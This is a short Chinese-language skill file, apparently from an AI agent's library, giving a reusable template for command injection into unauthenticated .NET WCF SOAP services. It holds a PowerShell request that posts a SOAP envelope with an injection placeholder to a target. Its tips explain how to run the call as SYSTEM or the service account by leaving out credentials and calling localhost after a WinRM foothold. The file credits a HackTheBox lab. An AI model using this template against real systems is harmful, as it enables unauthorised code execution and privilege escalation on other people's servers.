---
name: 'soap-wcf-injection'
description: 'WCF SOAP 注入通用模板：不加认证 + SOAPAction header + basicHttpBinding 注入模式'
disable-model-invocation: true
metadata: { domain: web, tier: T3 }
---


## WCF SOAP 注入通用模板

### 触发条件
- .NET WCF 服务使用 `basicHttpBinding`
- 方法内有命令执行（PowerShell Runspace / Process.Start / SQL 拼接）
- 参数无过滤

### 攻击流程

```powershell
# 1. 不加认证 → 服务以自身身份（SYSTEM/服务账户）运行
# 2. 必须带 SOAPAction header

# 简单调用
iwr http://TARGET:PORT/Service -Method POST -ContentType 'text/xml' -Body @'
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
<s:Body><SomeMethod xmlns="http://tempuri.org/">
<param>injection_here</param>
</SomeMethod></s:Body></s:Envelope>
'@ -Headers @{SOAPAction='http://tempuri.org/IContract/Method'} -UseBasicParsing
```text

### 从 Overwatch 学到的

1. **不要加 `-UseDefaultCredentials`** → 否则 WCF 模拟调用者（低权限），不加则用服务进程身份
2. **SOAPAction header 是必须的** → basicHttpBinding 需要
3. **SOAP 在本地（WinRM 进机器后调 localhost）比远程更可靠** — 端口常被防火墙过滤
4. **`strings -el` 对 .NET UTF-16LE 有效**，但完整反编译用 monodis/dotPeek

来源: Overwatch HTB
